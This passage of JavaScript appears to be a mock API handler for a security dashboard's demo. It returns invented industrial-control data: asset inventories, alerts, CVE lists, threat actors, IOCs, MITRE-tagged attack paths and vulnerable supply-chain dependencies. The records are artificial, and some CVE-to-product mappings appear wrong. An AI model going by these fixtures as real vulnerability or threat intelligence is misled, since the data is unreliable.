true, uptime_hours: 1440, last_seen: new Date(Date.now() - 300000).toISOString(), created_at: '2021-01-20T00:00:00Z' }, { id: 5, name: 'HIST-SERVER-01', asset_type: 'historian', vendor: 'OSIsoft', model: 'PI System 2012', firmware: 'PI Server 3.4.390', ip: '10.10.2.20', mac: '00:50:56:BB:CC:DD', zone: 'Supervisory', site: 'Site-Alpha', purdue_level: 3, criticality: 'high', risk_score: 64, is_online: true, uptime_hours: 26280, last_seen: new Date(Date.now() - 600000).toISOString(), created_at: '2012-11-01T00:00:00Z' }, { id: 6, name: 'SCADA-MAIN-01', asset_type: 'scada_server', vendor: 'Rockwell', model: 'FactoryTalk View SE', firmware: 'FTV-SE-12.0', ip: '10.10.2.10', mac: '00:60:97:DD:EE:FF', zone: 'Supervisory', site: 'Site-Alpha', purdue_level: 2, criticality: 'critical', risk_score: 69, is_online: true, uptime_hours: 8760, last_seen: new Date(Date.now() - 900000).toISOString(), created_at: '2018-05-12T00:00:00Z' }, { id: 7, name: 'SENSOR-TEMP-01', asset_type: 'sensor', vendor: 'Honeywell', model: 'TDC-3000', firmware: 'v2.1', ip: '10.10.0.101', mac: '00:90:27:11:AA:BB', zone: 'Production Cell A', site: 'Site-Alpha', purdue_level: 0, criticality: 'medium', risk_score: 31, is_online: true, uptime_hours: 43800, last_seen: new Date(Date.now() - 5000).toISOString(), created_at: '2015-02-01T00:00:00Z' }, { id: 8, name: 'OPC-SERVER-01', asset_type: 'opc_server', vendor: 'Kepware', model: 'KEPServerEX 6.8', firmware: 'KEPServerEX-6.8.262', ip: '10.10.2.30', mac: '00:50:56:AA:BB:CC', zone: 'Supervisory', site: 'Site-Alpha', purdue_level: 3, criticality: 'medium', risk_score: 52, is_online: true, uptime_hours: 4380, last_seen: new Date(Date.now() - 1800000).toISOString(), created_at: '2020-08-01T00:00:00Z' }]);
  if (p === '/ot/topology')       return ok({ nodes: [{ id: 1, name: 'PLC-UNIT-01', asset_type: 'plc', ip: '10.10.1.10', zone: 'Production Cell A', purdue_level: 1, is_online: true, risk_score: 88 }, { id: 2, name: 'HMI-CONTROL-01', asset_type: 'hmi', ip: '10.10.1.20', zone: 'Control Room', purdue_level: 2, is_online: true, risk_score: 82 }, { id: 4, name: 'EWS-SIEMENS-01', asset_type: 'engineering_workstation', ip: '10.10.0.5', zone: 'Engineering', purdue_level: 2, is_online: true, risk_score: 76 }, { id: 5, name: 'HIST-SERVER-01', asset_type: 'historian', ip: '10.10.2.20', zone: 'Supervisory', purdue_level: 3, is_online: true, risk_score: 64 }, { id: 6, name: 'SCADA-MAIN-01', asset_type: 'scada_server', ip: '10.10.2.10', zone: 'Supervisory', purdue_level: 2, is_online: true, risk_score: 69 }, { id: 8, name: 'OPC-SERVER-01', asset_type: 'opc_server', ip: '10.10.2.30', zone: 'Supervisory', purdue_level: 3, is_online: true, risk_score: 52 }], links: [{ src: '10.10.0.5', dst: '10.10.1.10', protocol: 'Modbus TCP', active: true }, { src: '10.10.1.20', dst: '10.10.1.10', protocol: 'EtherNet/IP', active: true }, { src: '10.10.2.10', dst: '10.10.1.20', protocol: 'OPC UA', active: true }, { src: '10.10.2.20', dst: '10.10.2.10', protocol: 'Historian', active: true }, { src: '10.10.2.30', dst: '10.10.1.10', protocol: 'OPC UA', active: true }, { src: '10.10.0.99', dst: '10.10.1.10', protocol: 'Modbus TCP', active: true, anomaly: 'unauthorized_source' }] });
  if (p === '/ot/protocols')      return ok({ protocol_stats: [{ protocol: 'Modbus TCP', count: 42 }, { protocol: 'EtherNet/IP', count: 28 }, { protocol: 'OPC UA', count: 14 }, { protocol: 'DNP3', count: 9 }, { protocol: 'IEC 60870-5-104', count: 4 }, { protocol: 'BACnet', count: 2 }, { protocol: 'S7', count: 1 }], supported_protocols: ['Modbus TCP', 'DNP3', 'OPC UA', 'EtherNet/IP', 'PROFINET', 'BACnet', 'IEC 60870-5-104', 'IEC 61850', 'S7', 'CIP', 'MQTT'], sessions: [{ src: '10.10.0.5', dst: '10.10.1.10', protocol: 'Modbus TCP', packets: 1240, bytes: 88320, last_seen: new Date(Date.now() - 300000).toISOString() }, { src: '10.10.1.20', dst: '10.10.1.10', protocol: 'EtherNet/IP', packets: 340, bytes: 24880, last_seen: new Date(Date.now() - 720000).toISOString() }, { src: '10.10.2.30', dst: '10.10.1.10', protocol: 'OPC UA', packets: 210, bytes: 18480, last_seen: new Date(Date.now() - 60000).toISOString() }, { src: '10.10.0.99', dst: '10.10.1.10', protocol: 'Modbus TCP', packets: 8, bytes: 480, last_seen: new Date(Date.now() - 30000).toISOString(), anomaly: 'unauthorized_source' }] });
  if (p === '/ot/traffic')        return ok([{ id: 1, src_ip: '10.10.0.5', dst_ip: '10.10.1.10', protocol: 'Modbus TCP', function_code: '0x10', operation: 'Write Multiple Registers', register_addr: '40001', value: '1024', is_authorized: false, severity: 'critical', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, src_ip: '10.10.1.20', dst_ip: '10.10.1.10', protocol: 'EtherNet/IP', function_code: '0x65', operation: 'Register Session', register_addr: '', value: '', is_authorized: true, severity: 'info', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, src_ip: '10.10.0.99', dst_ip: '10.10.1.10', protocol: 'Modbus TCP', function_code: '0x01', operation: 'Read Coils (broadcast probe)', register_addr: '0–65535', value: '', is_authorized: false, severity: 'high', created_at: new Date(Date.now() - 28800000).toISOString() }, { id: 4, src_ip: '10.10.2.30', dst_ip: '10.10.1.10', protocol: 'OPC UA', function_code: 'ReadRequest', operation: 'Tag Read', register_addr: 'ns=2;s=Reactor.Temp', value: '342.7', is_authorized: true, severity: 'info', created_at: new Date(Date.now() - 60000).toISOString() }, { id: 5, src_ip: '10.10.0.5', dst_ip: '10.10.1.33', protocol: 'DNP3', function_code: '0x81', operation: 'Response — Analog Input', register_addr: 'AI:0', value: '1.234', is_authorized: true, severity: 'info', created_at: new Date(Date.now() - 120000).toISOString() }]);
  if (p === '/ot/alerts')         return ok({ alerts: [{ id: 1, asset_id: 1, alert_type: 'unauthorized_plc_programming', title: 'Unauthorized PLC Write Commands Outside Maintenance Window', description: 'EWS-SIEMENS-01 (10.10.0.5) sent Modbus FC 0x10 Write Multiple Registers to PLC-UNIT-01 at 02:34 UTC — outside approved maintenance window.', severity: 'critical', protocol: 'Modbus TCP', src_ip: '10.10.0.5', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, asset_id: 4, alert_type: 'engineering_station_abuse', title: 'Engineering Workstation Communicating with Multiple PLCs (No Prior History)', description: 'EWS-SIEMENS-01 has initiated connections to 4 PLCs in the past 20 minutes — no historical precedent in 90-day baseline.', severity: 'critical', protocol: 'EtherNet/IP', src_ip: '10.10.0.5', status: 'open', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, asset_id: 0, alert_type: 'new_device', title: 'Unknown Device Detected on OT Network', description: 'New IP 10.10.0.99 appeared on production PLC subnet — MAC address not in asset inventory.', severity: 'high', protocol: 'Modbus TCP', src_ip: '10.10.0.99', status: 'open', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 4, asset_id: 1, alert_type: 'firmware_change', title: 'Unauthorized Firmware Change on PLC-UNIT-01', description: 'Firmware version changed from 3.3.11 to 3.3.12 — no authorized maintenance activity recorded.', severity: 'high', protocol: 'S7', src_ip: '10.10.0.5', status: 'investigating', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, asset_id: 0, alert_type: 'network_scanning', title: 'Network Scan Detected on OT Subnet', description: '240 probe packets from 10.10.0.99 swept Modbus port 502 across /24 subnet — classic ICS reconnaissance pattern.', severity: 'high', protocol: 'Modbus TCP', src_ip: '10.10.0.99', status: 'open', created_at: new Date(Date.now() - 28800000).toISOString() }, { id: 6, asset_id: 2, alert_type: 'protocol_misuse', title: 'FTP Traffic from PLC-UNIT-01 — Not in Baseline', description: 'PLC-UNIT-01 initiated outbound FTP connection to 192.168.100.5 — PLCs should not initiate IT protocol connections.', severity: 'medium', protocol: 'FTP', src_ip: '10.10.1.10', status: 'open', created_at: new Date(Date.now() - 172800000).toISOString() }], total: 6, open: 5, critical: 2 });
  if (p === '/ot/devices')        return ok({ devices: [{ id: 1, name: 'PLC-UNIT-01', asset_type: 'plc', firmware: '3.3.12', ip: '10.10.1.10', zone: 'Production Cell A', is_online: true, uptime_hours: 4320, last_seen: new Date(Date.now() - 30000).toISOString() }, { id: 2, name: 'HMI-CONTROL-01', asset_type: 'hmi', firmware: 'Win7-SP1', ip: '10.10.1.20', zone: 'Control Room', is_online: true, uptime_hours: 8760, last_seen: new Date(Date.now() - 60000).toISOString() }, { id: 3, name: 'RTU-FIELD-03', asset_type: 'rtu', firmware: '1.2.4', ip: '10.10.1.33', zone: 'Field Zone 3', is_online: true, uptime_hours: 17520, last_seen: new Date(Date.now() - 120000).toISOString() }, { id: 4, name: 'EWS-SIEMENS-01', asset_type: 'engineering_workstation', firmware: 'Win10-21H2', ip: '10.10.0.5', zone: 'Engineering', is_online: true, uptime_hours: 1440, last_seen: new Date(Date.now() - 300000).toISOString() }, { id: 5, name: 'HIST-SERVER-01', asset_type: 'historian', firmware: 'PI Server 3.4.390', ip: '10.10.2.20', zone: 'Supervisory', is_online: true, uptime_hours: 26280, last_seen: new Date(Date.now() - 600000).toISOString() }], firmware_changes: [{ id: 1, asset_id: 1, firmware_version: '3.3.12', previous_version: '3.3.11', changed_at: new Date(Date.now() - 86400000).toISOString(), changed_by: '10.10.0.5', is_authorized: false }, { id: 2, asset_id: 3, firmware_version: '1.2.4', previous_version: '1.2.3', changed_at: new Date(Date.now() - 604800000).toISOString(), changed_by: 'maintenance_crew', is_authorized: true }] });
  if (p === '/ot/threats')        return ok({ threats: [{ id: 1, alert_type: 'unauthorized_plc_programming', title: 'Unauthorized PLC Write Outside Maintenance Window', description: 'EWS-SIEMENS-01 sent Modbus FC 0x10 to PLC-UNIT-01 at 02:34 UTC', severity: 'critical', protocol: 'Modbus TCP', src_ip: '10.10.0.5', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, alert_type: 'new_device', title: 'Unknown Device on OT Network', description: 'IP 10.10.0.99 not in asset inventory — appeared on PLC subnet', severity: 'high', protocol: 'Modbus TCP', src_ip: '10.10.0.99', status: 'open', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 3, alert_type: 'network_scanning', title: 'Network Scan on OT Subnet', description: '240 Modbus probe packets swept production subnet', severity: 'high', protocol: 'Modbus TCP', src_ip: '10.10.0.99', status: 'open', created_at: new Date(Date.now() - 28800000).toISOString() }, { id: 4, alert_type: 'firmware_change', title: 'Unauthorized Firmware Change', description: 'PLC-UNIT-01 firmware 3.3.11→3.3.12 with no maintenance record', severity: 'high', protocol: 'S7', src_ip: '10.10.0.5', status: 'investigating', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, alert_type: 'lateral_movement', title: 'EWS Communicating with 4 PLCs (No Prior History)', description: 'EWS-SIEMENS-01 initiated connections to 4 PLCs in 20 minutes', severity: 'critical', protocol: 'EtherNet/IP', src_ip: '10.10.0.5', status: 'open', created_at: new Date(Date.now() - 7200000).toISOString() }], detection_categories: ['unauthorized_plc_programming', 'firmware_change', 'engineering_station_abuse', 'new_device', 'protocol_misuse', 'command_injection', 'unauthorized_write', 'network_scanning', 'lateral_movement'] });
  if (p === '/ot/dpi')            return ok({ decoded_frames: [{ id: 1, src_ip: '10.10.0.5', dst_ip: '10.10.1.10', protocol: 'Modbus TCP', function_code: '0x10', operation: 'Write Multiple Registers', register_addr: '40001', value: '1024', is_authorized: false, severity: 'critical', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, src_ip: '10.10.2.30', dst_ip: '10.10.1.10', protocol: 'OPC UA', function_code: 'ReadRequest', operation: 'Tag Read', register_addr: 'ns=2;s=Reactor.Temp', value: '342.7°C', is_authorized: true, severity: 'info', created_at: new Date(Date.now() - 60000).toISOString() }, { id: 3, src_ip: '10.10.0.5', dst_ip: '10.10.1.33', protocol: 'DNP3', function_code: '0x03', operation: 'Direct Operate', register_addr: 'CROB:0', value: 'LATCH_ON', is_authorized: true, severity: 'info', created_at: new Date(Date.now() - 120000).toISOString() }, { id: 4, src_ip: '10.10.0.5', dst_ip: '10.10.1.10', protocol: 'S7', function_code: '0x32', operation: 'S7comm Write Var', register_addr: 'DB1.DBW0', value: '0xFF', is_authorized: false, severity: 'high', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 5, src_ip: '10.10.1.20', dst_ip: '10.10.1.10', protocol: 'EtherNet/IP', function_code: '0x4C', operation: 'Get_Attribute_Single', register_addr: 'Class:0x01 Inst:0x01 Attr:0x07', value: '', is_authorized: true, severity: 'info', created_at: new Date(Date.now() - 7200000).toISOString() }] });
  if (p === '/ot/risk')           return ok({ total_assets: 47, internet_exposed: 2, unsupported_firmware: 4, weak_auth: 6, open_services: 8, missing_segmentation: 3, critical_assets: [{ name: 'PLC-UNIT-01', type: 'plc', ip: '10.10.1.10', risk: 88, reason: 'Internet-reachable via SCADA DMZ; no authentication required on Modbus port' }, { name: 'HMI-CONTROL-01', type: 'hmi', ip: '10.10.1.20', risk: 82, reason: 'Running Windows 7 EOL; remote desktop exposed to IT network' }, { name: 'EWS-SIEMENS-01', type: 'engineering_workstation', ip: '10.10.0.5', risk: 76, reason: 'Connected to both IT and OT networks; recent unauthorised PLC access' }, { name: 'RTU-FIELD-03', type: 'rtu', ip: '10.10.1.33', risk: 71, reason: 'DNP3 without authentication; firmware version 1.2.4 (EOL)' }, { name: 'HIST-SERVER-01', type: 'historian', ip: '10.10.2.20', risk: 64, reason: 'OSIsoft PI 2012; unpatched CVE-2020-8004' }], findings: [{ category: 'Internet Exposure', count: 2, severity: 'critical', detail: '2 OT assets reachable from internet via misconfigured firewall rules' }, { category: 'Unsupported Firmware', count: 4, severity: 'high', detail: '4 devices running firmware versions no longer receiving security updates' }, { category: 'Weak Authentication', count: 6, severity: 'high', detail: '6 PLCs and RTUs using default credentials or no authentication' }, { category: 'Open Services', count: 8, severity: 'medium', detail: '8 devices with unnecessary services (FTP, Telnet, HTTP) running' }, { category: 'Missing Segmentation', count: 3, severity: 'high', detail: '3 zones lack firewall enforcement between Purdue levels' }] });
  if (p === '/ot/vulnerabilities') return ok({ vulns: [{ id: 1, asset_id: 1, cve_id: 'CVE-2022-38465', cvss: 9.8, severity: 'critical', title: 'Siemens S7-300/S7-400 Global Private Key Disclosure', vendor_advisory: 'SSA-568969', patch_available: true, requires_maintenance_window: true, created_at: '2022-10-11T00:00:00Z' }, { id: 2, asset_id: 6, cve_id: 'CVE-2022-1161', cvss: 9.8, severity: 'critical', title: 'Rockwell Automation ControlLogix Remote Code Execution', vendor_advisory: 'PN1607', patch_available: true, requires_maintenance_window: true, created_at: '2022-04-07T00:00:00Z' }, { id: 3, asset_id: 3, cve_id: 'CVE-2021-26676', cvss: 8.8, severity: 'high', title: 'SEL RTAC DNP3 Authentication Bypass', vendor_advisory: 'SEL-2021-001', patch_available: false, requires_maintenance_window: true, created_at: '2021-03-01T00:00:00Z' }, { id: 4, asset_id: 5, cve_id: 'CVE-2020-8004', cvss: 7.8, severity: 'high', title: 'OSIsoft PI Vision Authentication Bypass', vendor_advisory: 'PI-AF-2020-003', patch_available: true, requires_maintenance_window: false, created_at: '2020-12-08T00:00:00Z' }, { id: 5, asset_id: 2, cve_id: 'CVE-2019-13945', cvss: 7.6, severity: 'high', title: 'Siemens S7-400 CPU DoS via malformed packet', vendor_advisory: 'SSA-686461', patch_available: true, requires_maintenance_window: true, created_at: '2019-10-08T00:00:00Z' }], critical: 2, high: 6, patchable: 4 });
  if (p === '/ot/zones')          return ok({ zones: [{ id: 1, name: 'Production Cell A', purdue_level: 1, asset_count: 8, allowed_protocols: 'Modbus TCP,EtherNet/IP', firewall_policy: 'whitelist', risk_score: 71 }, { id: 2, name: 'Control Room', purdue_level: 2, asset_count: 6, allowed_protocols: 'OPC UA,EtherNet/IP', firewall_policy: 'whitelist', risk_score: 68 }, { id: 3, name: 'Supervisory', purdue_level: 3, asset_count: 5, allowed_protocols: 'OPC UA,HTTPS,Historian', firewall_policy: 'partial', risk_score: 54 }, { id: 4, name: 'Field Zone 3', purdue_level: 1, asset_count: 9, allowed_protocols: 'DNP3,Modbus RTU', firewall_policy: 'none', risk_score: 78 }, { id: 5, name: 'Engineering', purdue_level: 2, asset_count: 4, allowed_protocols: 'S7,EtherNet/IP,RDP', firewall_policy: 'partial', risk_score: 76 }, { id: 6, name: 'DMZ', purdue_level: 3, asset_count: 3, allowed_protocols: 'HTTPS,OPC UA', firewall_policy: 'whitelist', risk_score: 45 }], purdue_model: [{ level: 4, name: 'Enterprise IT', description: 'Business planning & logistics (ERP, email, corporate IT)', asset_types: ['workstation', 'server', 'printer'] }, { level: 3, name: 'Operations & Business Logistics', description: 'Site-wide operations, Historians, MES systems', asset_types: ['historian', 'mes_server', 'reporting'] }, { level: 2, name: 'Supervisory Control', description: 'SCADA, DCS, HMI systems', asset_types: ['scada_server', 'hmi', 'dcs'] }, { level: 1, name: 'Control', description: 'PLCs, RTUs, field control devices', asset_types: ['plc', 'rtu', 'dcs_controller'] }, { level: 0, name: 'Process', description: 'Physical process: sensors, actuators, drives', asset_types: ['sensor', 'actuator', 'drive'] }], allowed_paths: [{ from_level: 4, to_level: 3, allowed: true, protocols: 'HTTPS,RDP (managed)', requires_firewall: true }, { from_level: 3, to_level: 2, allowed: true, protocols: 'OPC UA,Historian', requires_firewall: true }, { from_level: 2, to_level: 1, allowed: true, protocols: 'Modbus TCP,EtherNet/IP,DNP3', requires_firewall: false }, { from_level: 4, to_level: 1, allowed: false, protocols: '', requires_firewall: true }] });
  if (p === '/ot/baseline')       return ok({ baselines: [], categories: [{ type: 'normal_protocols', learned: true, items: 8, description: 'Approved OT protocol usage per device pair' }, { type: 'normal_commands', learned: true, items: 124, description: 'Expected Modbus/DNP3 function codes per PLC' }, { type: 'normal_devices', learned: true, items: 47, description: 'All known devices in the OT network' }, { type: 'normal_traffic', learned: true, items: 312, description: 'Expected communication flows and bandwidths' }, { type: 'maintenance_windows', learned: true, items: 6, description: 'Approved programming windows per site schedule' }], deviations: [{ id: 1, type: 'new_device', detail: 'Unknown IP 10.10.0.99 appeared on PLC subnet', severity: 'high', time: new Date(Date.now() - 7200000).toISOString() }, { id: 2, type: 'protocol_deviation', detail: 'Modbus write commands from EWS-01 outside maintenance window', severity: 'critical', time: new Date(Date.now() - 3600000).toISOString() }, { id: 3, type: 'traffic_spike', detail: 'Network scan detected — 240 probe packets from 10.10.0.99', severity: 'high', time: new Date(Date.now() - 28800000).toISOString() }, { id: 4, type: 'new_protocol', detail: 'FTP traffic observed from PLC-UNIT-01 — not in baseline', severity: 'medium', time: new Date(Date.now() - 86400000).toISOString() }] });
  if (p === '/ot/threat-intel')   return ok({ ot_threat_actors: [{ name: 'Sandworm', nation: 'Russia', targets: 'Energy, Water, Critical Infrastructure', malware: 'BlackEnergy, Industroyer, CaddyWiper', active: true, risk: 'critical' }, { name: 'XENOTIME', nation: 'Russia', targets: 'Oil & Gas, Safety Systems (SIS)', malware: 'TRITON/TRISIS', active: true, risk: 'critical' }, { name: 'APT40', nation: 'China', targets: 'Maritime, Defense, Aviation ICS', malware: 'Custom RATs', active: true, risk: 'high' }, { name: 'Lazarus Group', nation: 'North Korea', targets: 'Energy, Defense ICS', malware: 'BLINDINGCAN', active: true, risk: 'high' }, { name: 'MAGNALLIUM', nation: 'Iran', targets: 'ICS/SCADA, Oil & Gas', malware: 'POWERSHOWER', active: false, risk: 'medium' }], industrial_malware: [{ name: 'TRITON/TRISIS', type: 'SIS Attack', target: 'Schneider Triconex SIS', year: 2017, capability: 'Physical damage via Safety Instrumented System manipulation' }, { name: 'Industroyer/CRASHOVERRIDE', type: 'Power Grid Attack', target: 'IEC 60870-5-101/104, IEC 61850, OPC DA', year: 2016, capability: 'Electric grid disruption — caused 2016 Ukraine blackout' }, { name: 'Stuxnet', type: 'PLC Worm', target: 'Siemens S7-315/S7-417 + Step 7', year: 2010, capability: 'Physical destruction of centrifuges via PLC logic manipulation' }, { name: 'BlackEnergy', type: 'ICS Recon Malware', target: 'HMI systems, GE Cimplicity, Siemens WinCC', year: 2015, capability: 'Credential theft, file destruction, ICS plugin framework' }, { name: 'FrostyGoop', type: 'Modbus Attack', target: 'Lviv District Heating', year: 2024, capability: 'Direct Modbus TCP commands caused heating outage in winter' }], ioc_matches: [{ type: 'ip', value: '185.220.101.47', category: 'known_ot_scanner', hits: 3, threat_actor: 'Unknown' }, { type: 'domain', value: 'scada-update.ru', category: 'c2_domain', hits: 1, threat_actor: 'Sandworm' }], sector_advisories: [{ id: 'CISA-ICS-24-001', title: 'Rockwell Automation PLC RCE Vulnerability', severity: 'critical', date: '2024-01-15', affected: 'ControlLogix, CompactLogix' }, { id: 'CISA-ICS-24-007', title: 'Schneider Electric Modicon Authentication Bypass', severity: 'high', date: '2024-02-03', affected: 'Modicon M340, M580' }, { id: 'CISA-ICS-24-012', title: 'Siemens SIMATIC S7 Denial of Service', severity: 'high', date: '2024-03-12', affected: 'S7-300, S7-400, S7-1200, S7-1500' }] });
  if (p === '/ot/timeline')       return ok([{ id: 1, event_type: 'unauthorized_plc_programming', title: 'Unauthorized PLC Write Commands Outside Maintenance Window', severity: 'critical', source: '10.10.0.5', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, event_type: 'lateral_movement', title: 'EWS Communicating with 4 PLCs (No Prior History)', severity: 'critical', source: '10.10.0.5', status: 'open', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, event_type: 'new_device', title: 'Unknown Device Detected on OT Network', severity: 'high', source: '10.10.0.99', status: 'open', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 4, event_type: 'network_scanning', title: 'Modbus Port Scan on Production Subnet', severity: 'high', source: '10.10.0.99', status: 'open', created_at: new Date(Date.now() - 28800000).toISOString() }, { id: 5, event_type: 'firmware_change', title: 'Unauthorized Firmware Change on PLC-UNIT-01', severity: 'high', source: '10.10.0.5', status: 'investigating', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 6, event_type: 'analyst_action', title: 'Incident IR-2024-007 created by analyst', severity: 'info', source: 'analyst@xcloak.tech', status: 'closed', created_at: new Date(Date.now() - 90000000).toISOString() }]);
  if (p === '/ot/compliance')     return ok({ overall_score: 61, frameworks: [{ name: 'IEC 62443', score: 58, passed: 34, failed: 25, total: 59, version: '2018' }, { name: 'NIST SP 800-82', score: 67, passed: 28, failed: 14, total: 42, version: 'Rev.3' }, { name: 'NERC CIP', score: 72, passed: 23, failed: 9, total: 32, version: 'v7' }, { name: 'ISA/IEC 62443-3-3', score: 54, passed: 19, failed: 16, total: 35 }, { name: 'ISO 27019', score: 63, passed: 26, failed: 15, total: 41 }], failed_controls: [{ control: 'IEC62443-SR1.1', title: 'Human user identification and authentication', severity: 'critical', framework: 'IEC 62443' }, { control: 'IEC62443-SR2.1', title: 'Authorization enforcement', severity: 'high', framework: 'IEC 62443' }, { control: 'NERC-CIP-007-R1', title: 'Ports and services — disable unnecessary', severity: 'high', framework: 'NERC CIP' }, { control: 'NERC-CIP-010-R1', title: 'Baseline configuration management', severity: 'high', framework: 'NERC CIP' }, { control: 'SP800-82-3.3', title: 'Network segmentation between IT and OT', severity: 'critical', framework: 'NIST SP 800-82' }] });
  if (p === '/ot/attack-paths')   return ok({ paths: [{ id: 1, risk: 'critical', title: 'Internet → SCADA → PLC → Production Line', steps: [{ step: 1, layer: 'Internet', technique: 'Spearphishing / Watering Hole', mitre: 'T1566' }, { step: 2, layer: 'IT Network', technique: 'Lateral movement via compromised workstation', mitre: 'T1021' }, { step: 3, layer: 'DMZ', technique: 'Jump server pivot via weak credentials', mitre: 'T1078' }, { step: 4, layer: 'SCADA', technique: 'HMI takeover — SCADA historian credentials reused', mitre: 'T1078' }, { step: 5, layer: 'PLC', technique: 'Unauthorized Modbus write commands to PLC registers', mitre: 'T0836' }, { step: 6, layer: 'Production Line', technique: 'Physical process manipulation — shutdown or damage', mitre: 'T0831' }], exploited_assets: ['EWS-SIEMENS-01', 'HMI-CONTROL-01', 'PLC-UNIT-01'] }, { id: 2, risk: 'high', title: 'USB Drop → Engineering Workstation → PLC', steps: [{ step: 1, layer: 'Physical', technique: 'USB malware drop by insider / supply chain', mitre: 'T1091' }, { step: 2, layer: 'Engineering Workstation', technique: 'Autorun malware execution, credential harvest', mitre: 'T1204' }, { step: 3, layer: 'PLC', technique: 'PLC programming via Step7/TIA Portal — Stuxnet-style logic injection', mitre: 'T0873' }], exploited_assets: ['EWS-SIEMENS-01', 'PLC-UNIT-01'] }] });
  if (p === '/ot/analytics')      return ok({ alert_trend: Array.from({length: 14}, (_, i) => ({ date: new Date(Date.now() - (13-i)*86400000).toISOString().slice(0,10), count: Math.floor(Math.random()*8) + 1 })), most_active_plcs: [{ name: 'PLC-UNIT-01', commands_per_hour: 1240, writes: 84, reads: 1156, anomalies: 3 }, { name: 'PLC-UNIT-02', commands_per_hour: 880, writes: 44, reads: 836, anomalies: 0 }, { name: 'PLC-UNIT-03', commands_per_hour: 640, writes: 28, reads: 612, anomalies: 1 }], protocol_distribution: [{ protocol: 'Modbus TCP', percent: 42 }, { protocol: 'EtherNet/IP', percent: 28 }, { protocol: 'OPC UA', percent: 14 }, { protocol: 'DNP3', percent: 9 }, { protocol: 'IEC 60870-5-104', percent: 4 }, { protocol: 'Other', percent: 3 }], firmware_age: [{ category: '< 1 year', count: 12, color: '#22c55e' }, { category: '1–3 years', count: 18, color: '#eab308' }, { category: '3–5 years', count: 9, color: '#f97316' }, { category: '> 5 years (EOL risk)', count: 8, color: '#ef4444' }], config_changes_7d: Array.from({length: 7}, (_, i) => ({ day: ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'][i], count: [2,0,1,4,1,0,2][i] })) });

  // ── Supply Chain Security Enterprise ─────────────────────────────────────
  if (p === '/supply-chain/dashboard')       return ok({ repositories: 12, dependencies: 847, critical_cves: 3, high_risk_packages: 18, sboms: 9, build_pipelines: 8, signed_artifacts: 14, total_artifacts: 23, risk_score: 71, secret_findings: 11 });
  if (p === '/supply-chain/repositories')    return ok([{ id: 1, name: 'api-server', owner: 'xcloak-org', platform: 'github', language: 'Go', default_branch: 'main', last_commit: new Date(Date.now() - 3600000).toISOString(), contributor_count: 8, is_private: true, dep_count: 124, risk_score: 87, created_at: '2022-01-15T00:00:00Z' }, { id: 2, name: 'frontend', owner: 'xcloak-org', platform: 'github', language: 'TypeScript', default_branch: 'main', last_commit: new Date(Date.now() - 7200000).toISOString(), contributor_count: 5, is_private: true, dep_count: 312, risk_score: 62, created_at: '2022-02-01T00:00:00Z' }, { id: 3, name: 'legacy-service', owner: 'xcloak-org', platform: 'gitlab', language: 'Java', default_branch: 'master', last_commit: new Date(Date.now() - 86400000).toISOString(), contributor_count: 2, is_private: true, dep_count: 244, risk_score: 94, created_at: '2019-06-10T00:00:00Z' }, { id: 4, name: 'mobile-app', owner: 'xcloak-org', platform: 'github', language: 'Dart', default_branch: 'main', last_commit: new Date(Date.now() - 172800000).toISOString(), contributor_count: 3, is_private: true, dep_count: 89, risk_score: 48, created_at: '2023-03-20T00:00:00Z' }, { id: 5, name: 'infra-terraform', owner: 'xcloak-org', platform: 'github', language: 'HCL', default_branch: 'main', last_commit: new Date(Date.now() - 259200000).toISOString(), contributor_count: 4, is_private: true, dep_count: 12, risk_score: 73, created_at: '2022-07-01T00:00:00Z' }]);
  if (p === '/supply-chain/dependencies')    return ok([{ id: 1, repo_id: 3, package_name: 'log4j-core', version: '2.14.1', latest_version: '2.23.1', ecosystem: 'maven', license: 'Apache-2.0', cve_count: 3, is_direct: true, is_outdated: true, risk_score: 98, created_at: '2022-01-15T00:00:00Z' }, { id: 2, repo_id: 3, package_name: 'spring-webmvc', version: '5.3.15', latest_version: '6.1.8', ecosystem: 'maven', license: 'Apache-2.0', cve_count: 1, is_direct: true, is_outdated: true, risk_score: 82, created_at: '2022-01-15T00:00:00Z' }, { id: 3, repo_id: 1, package_name: 'golang.org/x/net', version: '0.0.0-20220114011407', latest_version: 'v0.26.0', ecosystem: 'go', license: 'BSD-3-Clause', cve_count: 2, is_direct: false, is_outdated: true, risk_score: 74, created_at: '2022-01-15T00:00:00Z' }, { id: 4, repo_id: 2, package_name: 'lodash', version: '4.17.15', latest_version: '4.17.21', ecosystem: 'npm', license: 'MIT', cve_count: 1, is_direct: true, is_outdated: true, risk_score: 61, created_at: '2022-02-01T00:00:00Z' }, { id: 5, repo_id: 2, package_name: 'event-stream', version: '3.3.4', latest_version: '3.3.6', ecosystem: 'npm', license: 'MIT', cve_count: 1, is_direct: false, is_outdated: false, risk_score: 99, created_at: '2022-02-01T00:00:00Z' }, { id: 6, repo_id: 2, package_name: 'next', version: '14.2.3', latest_version: '14.2.5', ecosystem: 'npm', license: 'MIT', cve_count: 0, is_direct: true, is_outdated: true, risk_score: 22, created_at: '2022-02-01T00:00:00Z' }]);
